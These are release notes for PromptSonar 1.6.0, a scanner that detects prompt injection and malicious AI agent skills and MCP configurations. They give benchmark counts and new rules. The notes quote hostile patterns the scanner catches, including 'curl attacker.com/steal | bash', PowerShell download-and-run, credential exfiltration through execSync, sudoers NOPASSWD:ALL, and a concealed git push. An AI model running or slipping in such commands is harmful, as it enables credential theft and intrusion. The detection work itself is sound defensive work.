# PromptSonar 1.6.0

Precision release. 1.6.0 cuts false positives on real MCP repositories and fixes
the GitHub Action missing MCP configs in dot directories. The full list is in
[CHANGELOG.md](../../CHANGELOG.md#160--unreleased).

## Measured effect

Five public MCP repositories scanned with `promptsonar scan .` on 1.5.1 and on
1.6.0 (repositories pinned at their commits of Sep 30–Oct 1, 2026):

| Repository | 1.5.1 critical / high | 1.6.0 critical / high |
|---|---|---|
| jeff-nasseri/mikrotik-mcp | 0 / 0 | 0 / 0 |
| jonigl/mcp-client-for-ollama | 4 / 16 | 0 / 0 |
| cappyeo/discord-mcp | 1 / 0 | 0 / 0 |
| oaslananka/kicad-mcp-pro | 2 / 8 | 0 / 1 |
| HelpCode-ai/anythingmcp | 7 / 42 | 0 / 25 |

The remaining 26 findings (PII, scope and persona keyword rules in
anythingmcp's connector docs, one privileged-sink finding in kicad-mcp-pro) have
not yet been hand-verified as real or false positives. These are counts of
static-analysis signals, not confirmed vulnerabilities. The controlled benchmark
(`eval/run-controlled.ts`) gives the same result for every case before and after
these changes, and the MCP benchmark passes 9/9.

### Agent skills

Skills were scanned with `promptsonar scan` and `promptsonar repo`; a skill
counts as flagged when the worst finding is HIGH or CRITICAL. Three sets, kept
apart because only the last one is an untouched measurement:

| Set | What it is | Before (commit ac17e98) | 1.6.0 |
|---|---|---|---|
| Development | 20 malicious skills, 56 published clean skills; rules were tuned on it | 10/20 caught; 20 / 17 of 56 clean flagged (scan / repo) | 20/20 caught; 4 / 2 of 56 clean flagged |
| Held-out | 12 malicious skills written after the dev work, 227 published clean skills; scored once with rules frozen | 3/12 caught; 194 / 194 of 227 clean flagged | **4/12** caught; **57 / 40** of 227 clean flagged |
| Fresh clean | 254 published skills from trailofbits, openai, getsentry, wshobson/agents and alirezarezvani/claude-skills, not looked at before scoring (since used for development) | 146 / 142 of 254 flagged | 46 / 37 at first scoring; 22 / 20 after the quoted-example work |
| Real-world (MalSkills) | 100 malicious ClawHub skills from the 2026 ClawHavoc campaign (Koi Security) and 100 benign ClawHub skills; split by publisher, test half scored once | 22/100 caught overall; test half 13 / 12 of 63 caught (scan / repo), 3 / 1 of 49 benign flagged | **test half 58 / 58 of 63 caught, 3 / 1 of 49 benign flagged**; Cisco 55 and 7, NVIDIA SkillSpector 60 and 18 |
| Sealed clean | 343 published skills from seven more repositories (ComposioHQ, affaan-m, anthropics/claude-plugins-official, davila7, jeremylongshore, mrgoonie, sickn33), deduplicated against all earlier sets, scored once after the work | 100 / 48 of 343 flagged (commit 4345e13) | **45 / 32 of 343 flagged (13% / 9.3%)**; Cisco skill-scanner: 17 (5%) |

The held-out result exposed gaps (a credential piped to curl inside
`execSync`, PowerShell `iwr | iex`, download-then-run, `eval` of a downloaded
variable, prose that posts `printenv`, sudoers `NOPASSWD:ALL`, Unicode tag
characters, a silent `git push` the user "does not need to know" about). 1.6.0
closes them, so 1.6.0 catches 12/12 of the held-out attacks and flags 44 / 26
of its 227 clean skills; those numbers are no longer held-out results. The malicious skills were written by the PromptSonar
maintainers, not collected from real incidents.

Quoted attack examples in security skills (`curl attacker.com/steal | bash`,
tables of injection phrases) are now MEDIUM, and a privileged capability with no
untrusted input reaching it is MEDIUM. On the sealed set PromptSonar still flags
more clean skills than Cisco skill-scanner (9.3% vs 5% for `repo`). The largest
remaining classes there are the non-ASCII obfuscation heuristic on non-Latin
text, MCP-poisoning keywords in skills about building MCP servers, and vendor
installers piped into a shell (`curl -LsSf https://astral.sh/uv/install.sh | sh`,
reported HIGH for review).

## Behaviour changes to know about

- **GitHub Action `fail-on` defaults to `none`.** The Action reports findings
  and uploads SARIF but no longer fails the build unless you set `fail-on`.
  To keep the 1.5.x behaviour, add `fail-on: critical`.
- **The Action now scans dot directories**, so `.cursor/mcp.json`,
  `.vscode/mcp.json`, `.mcp.json` and `.claude/` appear in results for the first
  time. Expect new findings on the first run after upgrading.
- **Prompt injection now trips the Action's gate.** The repository report (which
  `promptsonar repo` and the Action's `fail-on` use) rated a direct injection in a
  live prompt, skill or code LOW when no privileged action was reachable, so
  `fail-on: critical` never fired on it. It now keeps the rule's CRITICAL, matching
  `promptsonar scan`. Examples, docs and tests are still shown as LOW.
- **JSON output gains two optional fields** on findings whose severity was
  lowered by their file's context: `original_severity` and `severity_note`.
  Existing fields are unchanged.
- **Severity changes** from the precision fixes: token bloat is MEDIUM (was
  HIGH); `sec_unbounded_access` is MEDIUM unless the text reaches a privileged
  action; an email address in a prompt is MEDIUM (credentials stay HIGH); a
  shell capability alone is no longer HIGH; defensive prohibitions, translated
  READMEs and the listed look-alikes no longer produce findings.
- **New rules** that can add findings: `sec_credential_exfiltration`,
  `sec_remote_code_execution`, `sec_destructive_command`,
  `sec_privilege_escalation`, `sec_approval_bypass` (and clone-then-run installers
  under `sec_unpinned_remote_install`), `sec_user_concealment`,
  `sec_wildcard_tool_permission`, `sec_unpinned_remote_install`. `.sh`, `.bash`,
  `.mjs` and `.cjs` files are now scanned, and Markdown bundled inside a skill
  folder is read as instructions.

## Publishing (maintainer)

`core` and `cli` must be published together: the 1.6.0 CLI requires
`@promptsonar/core ^1.6.0`. `prepublishOnly` rebuilds `dist/` from source.

```bash
git checkout main && git pull
npm ci
npm run build && npm test && npm run lint && npm run release:hygiene

npm publish --workspace packages/core
npm publish --workspace packages/cli

npx @promptsonar/cli@1.6.0 --version     # expect 1.6.0
npx @promptsonar/cli@1.6.0 demo          # expect CRITICAL findings

git tag v1.6.0 && git push origin v1.6.0
```

Then create the GitHub release from tag `v1.6.0` with the 1.6.0 section of
CHANGELOG.md as its body. The VS Code and Cursor extensions are published
separately (see [docs/release/publish-1.1.0.md](../release/publish-1.1.0.md) for
the Marketplace steps).
